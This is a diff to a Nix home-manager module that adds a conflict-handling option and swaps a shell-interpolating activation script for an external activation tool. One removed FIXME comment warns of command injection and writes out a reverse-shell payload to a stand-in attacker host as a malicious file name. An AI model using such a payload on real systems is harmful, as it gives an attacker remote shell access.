@@ -2,17 +2,32 @@
 {
   config,
   lib,
+  pkgs,
   ...
 }: {
   options.custom.mutable = let
-    inherit (lib) mkOption types;
+    inherit (lib) mkOption mkPackageOption types;
   in {
+    package = mkPackageOption pkgs.flake "activate-mutable" {};
+
     file = mkOption {
       type = types.attrsOf (types.submodule {
         options = {
           source = mkOption {
             type = types.path;
             description = "Path to the source file";
+          };
+          onConflict = mkOption {
+            description = ''
+              What to do if the file was modified outside of Nix.
+
+              - `replace`: Silently replace the file with Nix's version.
+                (note: this will run on boot, use sparingly)
+              - `warn`: Log a warning and keep the file as is.
+            '';
+
+            type = types.enum ["replace" "warn"];
+            default = "warn";
           };
         };
       });
@@ -38,17 +53,12 @@
       })
       cfg.file;
 
-    # TODO: Copy files from a derivation to the user's home directory
-    # TODO: Use this for VS code config
-    # TODO: Check that the file hasn't been modified before overwriting (maybe preserve mtime during activation, and check for it before overwriting)
-    # TODO: How to handle files that were modified after activation? Activation scripts
-    # run on reboot and rebuild, so they could overwrite changes.
-    # FIXME: This is super insecure, A reverse shell could be injected using a file named "${bash -i >& /dev/tcp/attacker.com/1234 0>&1}"
-    home.activation.install-mutable = lib.hm.dag.entryAfter ["writeBoundary"] ''
-      ${lib.concatStringsSep "\n" (lib.attrsets.mapAttrsToList (name: value: ''
-          run cp --force "${value.source}" "${name}"
-        '')
-        cfg.file)}
-    '';
+    # TODO: Use other files described in the plan
+    home.activation.activate-mutable = let
+      configFile = pkgs.writeText "activate-mutable-config.json" (builtins.toJSON cfg.file);
+    in
+      lib.hm.dag.entryAfter ["writeBoundary"] ''
+        run ${lib.getExe cfg.package} activate ${configFile} ${config.home.homeDirectory}
+      '';
   };
 }
